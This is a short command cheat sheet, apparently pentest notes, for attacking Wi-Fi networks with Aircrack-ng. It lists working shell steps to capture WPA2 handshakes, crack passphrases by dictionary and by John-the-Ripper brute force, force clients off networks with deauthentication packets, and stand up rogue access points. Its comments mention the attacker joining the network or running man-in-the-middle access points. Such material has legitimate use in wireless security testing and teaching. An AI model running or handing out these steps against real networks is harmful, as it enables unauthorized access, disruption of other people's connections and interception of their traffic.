# Aircrack-ng

## Capture WPA2 Handshake and Crack Passphrase
```shell
# View wireless interfaces
iwconfig

# Bring down the wireless interface to allow monitor mode later
ip link set wlan0 down

# View programs that can cause conflicts and then kill them
airmon-ng check
airmon-ng check kill

# Bring up monitor mode for the interface to allow Wi-Fi traffic monitoring
airmon-ng start wlan0

# Grab the BSSID of the target AP from stdout
airodump-ng wlan0mon

# Create a capture file for the BSSID on channel 11; wait for a handshake to take place or deauth client and wait for handshake
airodump-ng --bssid 00:00:00:00:00:00 -c 11 -w apcap wlan0mon

# Using a dictionary attack to crack passphrase; if password can be cracked, the attacker can connect to the network or they could create MiTM APs
aircrack-ng -w ./pass_dict.lst apcap.cap

# Using John-the-Ripper to brute force the passphrase
john --stdout --incremental:alnum --min-length:10 --max-len:12 | aircrack-ng -e HOME -w - ./apcap.cap

# Turn monitor mode off when done and bring interface back up
airmon-ng stop wlan0mon
ip link set wlan0 up
```

## Client Deauthentication
Had to use TP-Link Wireless Adapter to do packet injection.

```shell
ip link set wlan0 down
airmon-ng start wlan0 1
airodump-ng -c 1 wlan0mon

# Deauth the client, airodump-ng should register the WPA handshake when client reconnects 
aireplay-ng --deauth 1 -a 00:00:00:00:00:00 -e TEST -c 11:11:11:11:11:11 wlan0mon
airmon-ng stop wlan0mon
```

## Create Fake Rogue WEP/WPA2 AP
```shell
# WEP AP will show up in AP list but won't get past authentication
airbase-ng -c 1 -w 1234567890 -v -N -e TEST wlan0mon

# WPA2 AP will show up in AP list but won't get past authentication
airbase-ng -c 1 -e TEST -Z 4 wlan0mon
```